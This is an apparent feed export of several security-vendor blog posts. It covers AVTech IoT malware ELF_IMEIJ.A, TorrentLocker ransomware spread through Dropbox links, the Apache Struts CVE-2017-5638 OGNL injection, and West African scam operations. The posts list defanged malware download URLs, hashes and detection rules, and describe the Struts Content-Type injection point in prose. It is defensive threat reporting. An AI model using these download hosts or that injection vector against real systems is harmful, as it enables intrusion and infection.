<p>The points of entry for this new Linux malware are connected AVTech devices such as IP cameras, CCTV equipment, and network recorders that support the AVTech cloud. Once the malware is installed onto the device, it gathers system information and network activity data. It can also execute shell commands from the malicious actor, initiate Distributed Denial of Service (DDoS) attacks, and terminate itself. Infected devices also put other devices connected to the same network at risk.</p>
<p>There are three IP addresses where ELF_IMEIJ.A can be downloaded, and they are hosted on two separate ISPs.</p>
<ul>
<li>hxxp://172.247.116.3:8080/Arm1</li>
<li>hxxp://172.247.116.21:85/Arm1</li>
<li>hxxp://192.154.108.2:8080/Arm1</li>
</ul>
<p>The IP addresses that we observed connecting to the download links are registered with an ISP based in South Korea.</p>
<p>According to <a href=""https://www.search-lab.hu/advisories/126-avtech-devices-multiple-vulnerabilities"" target=""_blank"">reports</a>, AVTech has over 130,000 different devices connected to the Internet, so this attack may be used to gain and maintain persistent access to these devices. The devices can also be turned into bots and used to drive large scale DDoS attacks. Like most connected devices, the targets are not secured by default and are impossible to directly monitor.</p>
<p>ELF_IMEIJ.A’s DDoS capabilities may bring around comparisons to Mirai, but they also have distinct differences:</p>
<table>
<tbody>
<tr>
<td width=""121""></td>
<td width=""240""><strong>MIRAI</strong></td>
<td width=""242""><strong>IMEIJ</strong></td>
</tr>
<tr>
<td width=""121""><strong>Affected Devices </strong></td>
<td width=""240""> Various</td>
<td width=""242"">AVTech</td>
</tr>
<tr>
<td width=""121""><strong>Used Ports</strong></td>
<td width=""240"">7547<br />
5555<br />
48101</td>
<td width=""242"">39999</td>
</tr>
<tr>
<td width=""121""><strong>Exploits</strong></td>
<td width=""240"">Devices with BusyBox software installed by bruteforce</td>
<td width=""242"">Devices unsecured cgi-bin scripts to install the malware ELF_IMEIJ.A</td>
</tr>
</tbody>
</table>
<p>ELF_IMEIJ.A joins a group of recently discovered malware that exploits the ARM platform on Linux devices. ARM is widely used for IoT and mobile devices, making it a necessary hurdle for attackers targeting these devices. Aside from IMEIJ, the malware group includes the <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/pokemon-themed-umbreon-linux-rootkit-hits-x86-arm-systems/"" target=""_blank"">Umbreon rootkit</a> (detected by Trend Micro as ELF_UMBREON) and the <a href=""https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/linux-security-a-closer-look-at-the-latest-linux-threats"" target=""_blank"">LuaBot</a> (detected by Trend Micro as ELF_LUABOT).</p>
<p><a href=""http://www.trendmicro.com/us/home/products/software/index.html"" target=""_blank"">Trend Micro™ Security</a> and <a href=""https://www.trendmicro.com/en_us/forHome/products/internet-security.html"" target=""_blank"">Trend Micro Internet Security</a> offer effective protection for this threat, with security features that can detect malware at the endpoint level. To protect connected devices Trend MicroTM Home Network Security can check internet traffic between the router and the devices connected to it. Enterprises can also use <a href=""https://www.trendmicro.com/en_us/business/products/network/deep-discovery/inspector.html"" target=""_blank"">Trend Micro™ Deep Discovery™ Inspector</a> which is a network appliance that monitors all ports and over 105 different network protocols to discover advanced threats and targeted attacks.</p>
<p><strong>The IMEIJ sample has the following SHA256 hash</strong>:</p>
<p>8040422762138d28aa411d8bb2307a93432416f72b292bf884fb7c7efde9f3f5</p>
<p><strong><em>Additional analysis by Ruby Santos</em></strong></p>
<p>Post from: <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/"">Trendlabs Security Intelligence Blog - by Trend Micro</a></p>
<p><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/new-linux-malware-exploits-cgi-vulnerability/"" rel=""nofollow"">New Linux Malware Exploits CGI Vulnerability</a></p>
<div class=""feedflare"">
<a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=nZvmeoUuGlQ:uAOhiCApXJs:yIl2AUoC8zA""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=yIl2AUoC8zA"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=nZvmeoUuGlQ:uAOhiCApXJs:F7zBnMyn0Lo""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=nZvmeoUuGlQ:uAOhiCApXJs:F7zBnMyn0Lo"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=nZvmeoUuGlQ:uAOhiCApXJs:qj6IDK7rITs""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=qj6IDK7rITs"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=nZvmeoUuGlQ:uAOhiCApXJs:V_sGLiPBpWU""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=nZvmeoUuGlQ:uAOhiCApXJs:V_sGLiPBpWU"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=nZvmeoUuGlQ:uAOhiCApXJs:l6gmwiTKsz0""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=l6gmwiTKsz0"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=nZvmeoUuGlQ:uAOhiCApXJs:gIN9vFwOqvQ""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=nZvmeoUuGlQ:uAOhiCApXJs:gIN9vFwOqvQ"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=nZvmeoUuGlQ:uAOhiCApXJs:TzevzKxY174""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=TzevzKxY174"" /></a>
</div><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/Anti-MalwareBlog/~4/nZvmeoUuGlQ"" width=""1"" />",http://feeds.trendmicro.com/~r/Anti-MalwareBlog/~3/nZvmeoUuGlQ/
"TorrentLocker Changes Attack Method, Targets Leading European Countries","<p>The <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/?s=TorrentLocker&amp;Submit=+Go+"">TorrentLocker</a> ransomware, which has been in a lull as of late, has recently come back with new variants (Detected by Trend Micro as RANSOM_CRYPTLOCK.DLFLVV, RANSOM_CRYPTLOCK.DLFLVW, RANSOM_CRYPTLOCK.DLFLVS and RANSOM_CRYPTLOCK.DLFLVU). These new variants are using a delivery mechanism that uses abused Dropbox accounts. This new type of attack is <a href=""https://www.trendmicro.com/vinfo/us/security/research-and-analysis/predictions/2017"">in line with our 2017 prediction</a> that ransomware would continue to evolve beyond the usual attack vectors.</p>
<p>TorrentLocker has continued to remain active beyond its peak, with its low detection rates allowing the cybercriminals behind it to work behind the scenes while continuing attacks against unwitting victims.</p>
<p><strong><em>A familiar foe in a new disguise</em></strong></p>
<p>The new TorrentLocker variants have similar behavior as the previous examples we’ve detected, with the primary changes being its new distribution method and the way the malware executable itself is packaged.</p>
<p>An example of the new TorrentLocker attack begins with an email claiming to be an invoice from a supplier of the organization where the victim works. The “invoice” itself does not come as an email attachment, but is accessed instead via a Dropbox link that contains text referencing bills, invoices or account numbers to make it seem authentic. Using Dropbox as a URL link allows TorrentLocker to evade gateway sensors since there is no attachment and the link is from a legitimate website.</p>
<p align=""center""><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/torrentlocker-ransom-note.jpg""><br />
<img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/torrentlocker-ransom-note.jpg"" width=""504"" /></a></p>
<p style=""text-align: center;""><em>Figure 1: Example of a TorrentLocker phishing email </em></p>
<p>Once the user clicks on the link, a JavaScript file (JS_NEMUCOD) disguised as the invoice document will be downloaded to the victim’s computer. When the user tries to open the fake invoice, another obfuscated JavaScript file will be downloaded to memory, after which the TorrentLocker payload will be downloaded and executed in the system.</p>
<p>A notable feature of the new TorrentLocker variants is that they are packaged as NSIS installers to avoid detection, a technique also used by other prominent ransomware such as CERBER, LOCKY, SAGE and SPORA.</p>
<p><strong><em>Scope of Attacks </em></strong></p>
<p>From February 26 to March 6, 2017 our <a href=""https://www.trendmicro.com/en_ca/business/technologies/smart-protection-network.html"">Smart Protection Network</a> detected 54,688 spam emails which included URLs going to 815 different DropBox accounts. The bulk of this attack occured in Europe, with Germany and Norway taking up the largest percentage. Attacks in Norway peaked during the end of February but gradually shifted to Germany during early March. The ransomware’s perpetrators pulled off the largest number of attacks during the weekdays with a lull during the weekends. We discovered significant increases in infections at approximately 9 to 10 am, coinciding with the start of the work day—most likely from employees checking their daily emails for the first time. Organizations commonly use Dropbox  to manage and transfer their files, which can result in unsuspecting employees getting tricked into believing that the URL contained in the email is legitimate.</p>
<p align=""center""><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/torrentlocker-chart.jpg""><br />
<img alt="""" src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/torrentlocker-chart.jpg"" width=""600"" /></a></p>
<p style=""text-align: center;""><em>Figure 2: Timeline showing the peak hours of the attacks</em></p>
<p align=""center""><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/torrentlocker-distribution.jpg""><br />
<img alt="""" height=""512"" src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/torrentlocker-distribution.jpg"" width=""896"" /></a></p>
<p style=""text-align: center;""><em>Figure 3: Distribution of attacks</em></p>
<p>We are currently working with Dropbox on this issue. As per Dropbox’s security team, all files discovered at the time of publishing have been taken down and their respective users banned.</p>
<p><strong><em>Mitigating TorrentLocker</em></strong></p>
<p>Given the deceptive nature of the new TorrentLocker and other similar ransomware, organizations <a href=""https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/infosec-guide-email-threats"">should take extra steps</a> to ensure that they are protected from these kinds of social engineering attacks. The number one priority should be educating their employees on the <a href=""https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/best-practices-identifying-and-mitigating-phishing-attacks"">best practices against phishing attacks</a>, which includes checking any email for suspicious content such as the sender’s display name or any mismatched URLs. In fact, end users should be advised to refrain from downloading attachments or clicking embedded links in general, unless they are absolutely certain that it comes from a legitimate source.</p>
<p>Users should also take steps to ensure that their data is backed up by <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/world-backup-day-the-3-2-1-rule/"">implementing the 3-2-1 backup policy</a>, which involves saving at least three copies of data, with two copies in different storage types—preferably on an internal and removable drive—and one copy off-site.</p>
<p><strong><em>Trend Micro Solutions</em></strong></p>
<p>In addition to the best practices suggested above, Trend Micro customers can use the following solutions to further mitigate ransomware threats like TorrentLocker:</p>
<p>When addressing these kinds of threats, reacting as they occur isn’t enough. Strategic planning and a proactive, multilayered approach to security goes a long way—from the <a href=""http://www.trendmicro.com/us/business/complete-user-protection/index.html"">gateway</a>, <a href=""http://www.trendmicro.com/us/enterprise/product-security/vulnerability-protection/"">endpoints</a>, <a href=""http://www.trendmicro.com/us/enterprise/security-risk-management/deep-discovery/#network-protection"">networks</a>, and <a href=""http://www.trendmicro.com/us/enterprise/cloud-solutions/deep-security/software/"">servers</a>.</p>
<p><a href=""http://www.trendmicro.com/us/enterprise/product-security/officescan/"">Trend Micro</a> <a href=""http://www.trendmicro.com/us/enterprise/product-security/officescan/"">OfficeScan</a>™ with <a href=""http://www.trendmicro.com/us/business/xgen/index.html"">XGen</a>™ endpoint security combines machine learning and behavioral analysis with traditional approaches to identify and block ransomware. We have tested these technologies on the malware described in this post and found them to be effective pro-active solutions.</p>
<p><a href=""https://www.trendmicro.com/en_us/business/products/user-protection/sps/email-and-collaboration/cloud-app-security.html"">Trend Micro</a>™  <a href=""https://www.trendmicro.com/en_us/business/products/user-protection/sps/email-and-collaboration/cloud-app-security.html"">Cloud App Security</a> provides advanced malware protection for Dropbox Business accounts including TorrentLocker.   Cloud App Security investigates the behavior of suspect files by detonating in a virtual sandbox, not just through static pattern matching.  It leverages proven <a href=""https://www.trendmicro.com/en_ca/business/products/network/deep-discovery.html"">Trend Micro</a>™ <a href=""https://www.trendmicro.com/en_ca/business/products/network/deep-discovery.html"">Deep Discovery</a>™ sandbox technology, which was rated Most Effective Recommended Breach Detection System by NSS Labs</p>
<p>Trend Micro endpoint solutions such as <a href=""http://www.trendmicro.com/us/business/complete-user-protection/index.html"">Trend Micro</a>™ <a href=""http://www.trendmicro.com/us/business/complete-user-protection/index.html"">Smart Protection Suites</a>, and <a href=""http://www.trendmicro.com/us/small-business/product-security/"">Worry-Free</a>™ <a href=""http://www.trendmicro.com/us/small-business/product-security/"">Business Security</a> can protect users and businesses from these threats by detecting malicious files, and spammed messages as well as blocking all related malicious URLs <a href=""http://www.trendmicro.com/us/enterprise/security-risk-management/deep-discovery/"">Trend Micro</a> <a href=""http://www.trendmicro.com/us/enterprise/security-risk-management/deep-discovery/"">Deep Discovery</a>™ has an email inspection layer that can protect enterprises by detecting malicious attachment and URLs.</p>
<p>TippingPoint customers are protected from this threat via these MainlineDV filters:</p>
<ul>
<li>21354: TLS: ABUSE.CH SSL Blacklist Malicious SSL certificate detected (TorrentLocker CnC)</li>
<li>30623: TLS: Suspicious SSL Certificate (DGA)</li>
</ul>
<p><strong><em>With additional analysis from Anthony Melgarejo</em></strong></p>
<p>The following SHA256 hashes were involved in this attack:</p>
<ul>
<li>0d27f890c38435824f64937aef1f81452cb951c8f90d6005cc7c46cb158e255f (Detected by Trend Micro as JS_NEMUCOD.THCOF)</li>
<li>1a06e44df2fcf39471b7604695f0fc81174874219d4226d27ef4453ae3c9614b (Detected by Trend Micro as Ransom_CRYPTLOCK.DLFLVV)</li>
<li>aa4a0dde592488e88143028acdb8f035eb0453f265efeeebba316a6afe3e2b73 (Detected by Trend Micro as Ransom_CRYPTLOCK.DLFLVV)</li>
<li>5149f7d17d9ca687c2e871dc32e968f1e80f2a112c574663c95cca073283fc27 (Detected by Trend Micro as Ransom_CRYPTLOCK.DLFLVW)</li>
<li>efcc468b3125fbc5a9b1d324edc25ee3676f068c3d2abf3bd845ebacc274a0ff (Detected by Trend Micro as Ransom_CRYPTLOCK.DLFLVU)</li>
<li>287ebf60c34b4a18e23566dbfcf5ee982d3bace22d148b33a27d9d1fc8596692 (Detected by Trend Micro as Ransom_CRYPTLOCK.DLFLVU)</li>
<li>ddac25f45f70af5c3edbf22580291aebc26232b7cc4cc37b2b6e095baa946029 (Detected by Trend Micro as Ransom_CRYPTLOCK.DLFLVU)</li>
<li>1ffb16211552af603a6d13114178df21d246351c09df9e4a7a62eb4824036bb6 (Detected by Trend Micro as Ransom_CRYPTLOCK.DLFLVS)</li>
<li>1a9dc1cb2e972841aa6d7908ab31a96fb7d9256082b422dcef4e1b41bfcd5243 (Detected by Trend Micro as Ransom_CRYPTLOCK.DLFLVS)</li>
<li>028b3b18ef56f02e73eb1bbc968c8cfaf2dd6504ac51c681013bcf8e6531b2fc (Detected by Trend Micro as Ransom_CRYPTLOCK.DLFLVS)</li>
<li>98aad54148d12d6d9f6cab44974e3fe8e1175abc87ff5ab10cc8f3db095c3133 (Detected by Trend Micro as Ransom_CRYPTLOCK.DLFLVS)</li>
<li>f914b02c6de92d6bf32654c53b4907d8cde062efed4f53a8b1a7b73f7858cb11 (Detected by Trend Micro as Ransom_CRYPTLOCK.DLFLVS)</li>
</ul>
<p><em><strong>Updated on March 9, 2017, 3:26 PM (UTC-7):</strong></em><br />
We added a pie chart showing the distribution of attacks.</p>
<p>Post from: <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/"">Trendlabs Security Intelligence Blog - by Trend Micro</a></p>
<p><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/torrentlocker-changes-attack-method-targets-leading-european-countries/"" rel=""nofollow"">TorrentLocker Changes Attack Method, Targets Leading European Countries</a></p>
<div class=""feedflare"">
<a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=AqZYC7oF6lg:rO3LItMuISQ:yIl2AUoC8zA""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=yIl2AUoC8zA"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=AqZYC7oF6lg:rO3LItMuISQ:F7zBnMyn0Lo""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=AqZYC7oF6lg:rO3LItMuISQ:F7zBnMyn0Lo"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=AqZYC7oF6lg:rO3LItMuISQ:qj6IDK7rITs""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=qj6IDK7rITs"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=AqZYC7oF6lg:rO3LItMuISQ:V_sGLiPBpWU""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=AqZYC7oF6lg:rO3LItMuISQ:V_sGLiPBpWU"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=AqZYC7oF6lg:rO3LItMuISQ:l6gmwiTKsz0""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=l6gmwiTKsz0"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=AqZYC7oF6lg:rO3LItMuISQ:gIN9vFwOqvQ""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=AqZYC7oF6lg:rO3LItMuISQ:gIN9vFwOqvQ"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=AqZYC7oF6lg:rO3LItMuISQ:TzevzKxY174""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=TzevzKxY174"" /></a>
</div><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/Anti-MalwareBlog/~4/AqZYC7oF6lg"" width=""1"" />",http://feeds.trendmicro.com/~r/Anti-MalwareBlog/~3/AqZYC7oF6lg/
CVE-2017-5638: Apache Struts 2 Vulnerability Leads to Remote Code Execution,"<p>Apache Struts is a free and open-source framework used to build Java web applications. We looked into past several Remote Code Execution (RCE) vulnerabilities reported in Apache Struts, and observed that in most of them, attackers have used Object Graph Navigation Language (OGNL) expressions. The use of OGNL makes it easy to execute arbitrary code remotely because Apache Struts uses it for most of its processes.</p>
<p>Using OGNL, a <a href=""https://github.com/tengzhangchao"">researcher </a>found a new remote code execution vulnerability in Apache Struts 2, designated as CVE-2017-5638. An exploit has been <a href=""https://www.theregister.co.uk/2017/03/09/apache_under_attack_patch_for_zero_day_available/"">reported </a>to be already in the wild; our own research and monitoring have also seen attacks using the vulnerability.</p>
<p><strong><em>Attack Scenario</em></strong></p>
<p>This particular vulnerability can be exploited if the attacker sends a crafted request to upload a file to a vulnerable server that uses a Jakarta-based plugin to process the upload request.</p>
<p>The attacker can then send malicious code in the Content-Type header to execute the command on a vulnerable server. A <a href=""https://github.com/tengzhangchao/Struts2_045-Poc"">proof of concept</a> that demonstrates the attack scenario is publicly available.</p>
<p><strong><em>Vulnerability</em></strong> <strong><em>Dissection</em></strong></p>
<p>We took a closer look at the <a href=""https://git-wip-us.apache.org/repos/asf?p=struts.git;a=commitdiff;h=6b8272ce47160036ed120a48345d9aa884477228"">patch</a> to further understand the vulnerability and found that the vendor removed the usage of Class “<em>LocalizedTextUtil</em>” from <a href=""https://git-wip-us.apache.org/repos/asf?p=struts.git;a=blob;f=core/src/main/java/org/apache/struts2/interceptor/FileUploadInterceptor.java;h=b9f5cb6f5adc52f9a23b955a2d864d2fde5471a1""><em>FileUploadInterceptor.java</em></a>. This was meant to give an error message to the user if the file upload, using multipart HTTP request, is not successful.</p>
<p align=""center""><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/CVE-2017-5638-1.jpg""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/CVE-2017-5638-1.jpg"" width=""600"" /></a></p>
<p style=""text-align: center;""><em>Figure 1: </em><a href=""https://git-wip-us.apache.org/repos/asf?p=struts.git;a=commitdiff;h=6b8272ce47160036ed120a48345d9aa884477228""><em>Patch diff code</em></a><em> snapshot</em></p>
<p>To provide an appropriate error message to the user, it used the function “<em>findText</em>” defined in <em>LocalizedTextUtil</em> to parse the error key message and get the <a href=""https://cwiki.apache.org/confluence/display/WW/File+Upload#FileUpload-AlternateLibraries"">defined error message</a> for it.</p>
<p align=""center""><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/CVE-2017-5638-2.jpg""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/CVE-2017-5638-2.jpg"" width=""600"" /></a></p>
<p style=""text-align: center;""><em>Figure 2: <a href=""https://cwiki.apache.org/confluence/display/WW/File+Upload#FileUpload-AlternateLibraries"">Defined error messages</a> in Apache Struts’ File Upload function</em></p>
<p>The <em>findText </em>function definition is:</p>
<p style=""padding-left: 30px;""><span style=""font-family: Consolas, Monaco, monospace;"">public static <a href=""http://docs.oracle.com/javase/7/docs/api/java/lang/String.html?is-external=true"">String</a> findText(<a href=""http://docs.oracle.com/javase/7/docs/api/java/lang/Class.html?is-external=true"">Class</a> aClass, <a href=""http://docs.oracle.com/javase/7/docs/api/java/lang/String.html?is-external=true"">String</a> aTextName,<br />
<a href=""http://docs.oracle.com/javase/7/docs/api/java/util/Locale.html?is-external=true"">Locale</a> locale, <a href=""http://docs.oracle.com/javase/7/docs/api/java/lang/String.html?is-external=true"">String</a> defaultMessage, <a href=""http://docs.oracle.com/javase/7/docs/api/java/lang/Object.html?is-external=true"">Object</a>[] args )</span></p>
<p>This function finds a locally saved text message for the given error key passed in variable “<em>aTextName</em>”. The parameters are:</p>
<p style=""padding-left: 30px;""><em>aClass</em>: <em>FileUploadInterceptor</em> passes the error class to use as the start point of the error message search</p>
<p style=""padding-left: 30px;""><em>aTextName</em>: the error key used to find the error message for it</p>
<p style=""padding-left: 30px;""><em>Locale</em>: the locale where the message is saved for the respective error key</p>
<p style=""padding-left: 30px;""><em>defaultMessage</em>: the message to be returned if no text message can be found in any resource bundle</p>
<p style=""padding-left: 30px;""><em>args:</em> the error arguments’ resource bundle</p>
<p>If the message is found, those will be treated as an OGNL expression and evaluated as such. So, if an attacker passes the OGNL expression in Content-Type header with “multipart/form-data”, it will be evaluated and could help the attacker to execute arbitrary code remotely.</p>
<p>To fix this issue, the vendor has removed the usage of class “<em>LocalizedTextUtil</em>”, along with “<em>java.io.File</em>”, which can be used to output the RCE result to the attacker.</p>
<p>Apache Struts versions Struts 2.3.5 &#8211; Struts 2.3.31, Struts 2.5 &#8211; Struts 2.5.10 are <a href=""https://cwiki.apache.org/confluence/display/WW/S2-045?from=timeline&amp;isappinstalled=0"">reported</a> to be affected. If you are using the Jakarta-based file upload Multipart parser, upgrading to Apache Struts version 2.3.32 or 2.5.10.1 is recommended. You can also switch to a different <a href=""https://cwiki.apache.org/confluence/display/WW/File+Upload#FileUpload-AlternateLibraries"">implementation</a> of the Multipart parser.</p>
<p><strong><em>Trend Micro Solutions </em></strong></p>
<p><a href=""https://www.trendmicro.com/us/enterprise/cloud-solutions/deep-security/index.html"">Trend Micro</a>™ <a href=""https://www.trendmicro.com/us/enterprise/cloud-solutions/deep-security/index.html"">Deep Security</a>™ protects endpoints from threats that exploit vulnerabilities. <a href=""https://www.trendmicro.com/us/enterprise/security-risk-management/deep-discovery/"">Trend Micro</a>™ <a href=""https://www.trendmicro.com/us/enterprise/security-risk-management/deep-discovery/"">Deep Discovery</a>™ provides detection, in-depth analysis, and proactive response to attacks using exploits and other similar threats through specialized engines, custom <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/deploying-a-smart-sandbox-for-unknown-threats-and-zero-day-attacks/"">sandboxing</a>, and seamless correlation across the entire attack lifecycle, allowing it to detect these kinds of attacks even without any engine or pattern update.</p>
<p>Deep Security™ provides protection from any threats that may target this vulnerability via the following DPI rule:</p>
<ul>
<li>1008207 &#8211; Apache Struts2 Remote Code Execution Vulnerability (CVE-2017-5638)</li>
</ul>
<p>Deep Discovery Inspector protects customers from this threat via this DDI Rule:</p>
<ul>
<li>Beta Rule ID: 3421 &#8211; CVE-2017-5638_HTTP_APACHESTRUTS_EXPLOIT</li>
</ul>
<p>TippingPoint customers are protected from this threat via these Custom Shield Writer (CSW) and MainlineDV filters:</p>
<ul>
<li>CSW: HTTP: Apache Struts Content-type Command Injection Vulnerability (CVE-2017-5638)</li>
<li>27410: HTTP: Apache Struts Content-type Command Injection Vulnerability (CVE-2017-5638)</li>
</ul>
<p><em><strong>Updated as of March 13, 2017, 8:06 PM, UTC-7:</strong></em><br />
We updated the section on Trend Micro solutions, particularly on Deep Security™.</p>
<p>Post from: <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/"">Trendlabs Security Intelligence Blog - by Trend Micro</a></p>
<p><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/cve-2017-5638-apache-struts-vulnerability-remote-code-execution/"" rel=""nofollow"">CVE-2017-5638: Apache Struts 2 Vulnerability Leads to Remote Code Execution</a></p>
<div class=""feedflare"">
<a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=huXtTU34c4Q:u7XeWNaSKwU:yIl2AUoC8zA""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=yIl2AUoC8zA"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=huXtTU34c4Q:u7XeWNaSKwU:F7zBnMyn0Lo""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=huXtTU34c4Q:u7XeWNaSKwU:F7zBnMyn0Lo"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=huXtTU34c4Q:u7XeWNaSKwU:qj6IDK7rITs""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=qj6IDK7rITs"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=huXtTU34c4Q:u7XeWNaSKwU:V_sGLiPBpWU""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=huXtTU34c4Q:u7XeWNaSKwU:V_sGLiPBpWU"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=huXtTU34c4Q:u7XeWNaSKwU:l6gmwiTKsz0""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=l6gmwiTKsz0"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=huXtTU34c4Q:u7XeWNaSKwU:gIN9vFwOqvQ""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=huXtTU34c4Q:u7XeWNaSKwU:gIN9vFwOqvQ"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=huXtTU34c4Q:u7XeWNaSKwU:TzevzKxY174""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=TzevzKxY174"" /></a>
</div><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/Anti-MalwareBlog/~4/huXtTU34c4Q"" width=""1"" />",http://feeds.trendmicro.com/~r/Anti-MalwareBlog/~3/huXtTU34c4Q/
Is West Africa Poised for an Underground Market?,"<p>Based on an INTERPOL survey featured in a joint Trend Micro-INTERPOL research paper, West African cybercriminals stole an average of US$2.7 million from businesses and an average of US$422,000 from individuals from 2013 to 2015. Scams or various types of fraud, whether simple (like 419 or Nigerian prince scams) or complex (like business email compromise [BEC] scams), run rampant in the West African threat landscape. In fact, most of the online scams we see now may have to do with the increase in the region’s cybercriminal activity volume.</p>
<p>While conducting research on cybercrime in West Africa, we stumbled upon a scamming operation dubbed “Z*N.” In it, the cybercriminal uses keyloggers to gather the email credentials of employees in order to hijack ongoing financial transactions. As such, hijacked funds ended up in accounts that the cybercriminal control.</p>
<p>The cybercriminal mistakenly installed the keylogger onto his own computer. This “slip” allowed us to access his logs and find details about him (personal data) and his operation. It also gave us an insight into what goes on in a typical scamming operation:</p>
<p align=""center""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/westafrica2.png"" /></p>
<p align=""center""><i>Figure 1. Steps in a typical scamming operation</i></p>
<p><em><strong>Profiling the West African Cybercriminal</strong></em></p>
<p>West African cybercriminals can be classified into two major types—Yahoo! boys and next-level cybercriminals.</p>
<p>Yahoo boys can be likened to <a href=""https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/brazilian-cybercriminal-underground-2015"">Brazilian cybercriminals</a> who like to brag about their ill-gotten gains on social media. They are around 20−29 years old and have basic technical know-how and so run simpler scams (advance-fee, stranded-traveler, and romance scams). They communicate with fellow cybercriminals through social media and typically follow a ringleader or mastermind.</p>
<p>Next-level cybercriminals, meanwhile, run more complex scams akin to “long cons” (tax and BEC scams). They are more tech-savvy and frequent underground forums to obtain tools like malware.</p>
<p><em><strong>Trend Micro and Law Enforcement Collaboration</strong></em></p>
<p>The volume of cybercriminal activities in West Africa has been increasing. And the region’s cybercriminals are evolving—going for more complex than simpler scams to gain more profit. Are we bound to see a West African underground market emerge soon?</p>
<p>Although 30% of all the cybercrime reported to law enforcement agencies in West Africa lead to arrests, roadblocks like obtaining information from overseas and finding cybercriminals’ actual physical locations still exist. This is especially true for money mules (in next-level cybercriminals’ networks) who reside abroad.  Typically, money mules are fellow West Africans who have bank accounts in the countries their affiliates wish to steal money from. Only a few money mules get arrested though. This could be due to the fact that mules reside outside West Africa and so are no longer part of the region’s police jurisdiction.  West African law enforcement agencies thus focus more on arresting IT  technicians (who take care of an operation’s infrastructure) and fraud operators (who actually engage in social engineering activities), especially since they reside within the region.</p>
